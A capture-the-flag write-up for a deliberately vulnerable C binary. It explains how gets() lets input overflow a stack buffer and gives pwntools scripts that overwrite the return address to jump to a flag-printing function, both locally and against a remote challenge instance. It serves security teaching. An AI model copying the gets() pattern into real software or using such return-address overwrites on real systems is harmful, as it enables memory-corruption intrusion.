We are provided with the compiled vuln binary, the source code vuln.c and a remote instance to connect to.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

Source code analysis

At the beginning of the code we define a buffer of 32 bytes and a flag length of 64 bytes, then we have two relevant functions win() and vuln(). When executing the binary we are in the vuln function and our input processes it with the gets() function.

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

This function is insecure because it does not perform any checks, as the documentation indicates.

In the win() function it gives us the flag, knowing this we can deduce that we must control the return address so that the win() function is executed.

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

This binary is vulnerable to a buffer overflow because if we execute it and enter several A it shows us the memory address and a Segmentation fault error. This is due to the use of the gets() function.

The function starts from 0x080491f6, with this we can start building the exploit.

Solution

Create a flag.txt file in my current directory with a random flag, program a Python script that sends 44 A plus the memory address where the win() function starts, this exploit allows to solve the challenge locally.

from pwn import *

p = process('./vuln')

payload = b'A' * 44
payload += p32(0x080491f6)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())

By executing the exploit we will get our flag locally.

Flag

With the following script we can get the remote flag.

from pwn import *

def get_process():
    if len(sys.argv) != 2:
        print('Usage: python3 solve.py <ip:port>')
        exit(1)
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def main():
    conn = get_process()
    
    payload = b'A' * 44
    payload += p32(0x080491f6)
    
    conn.sendlineafter(b'Please enter your string: ', payload)
    
    conn.recv()
    print(conn.recv())
    print(conn.recv())

if __name__ == '__main__':
    main()

By executing the exploit with the remote instance we get the flag.
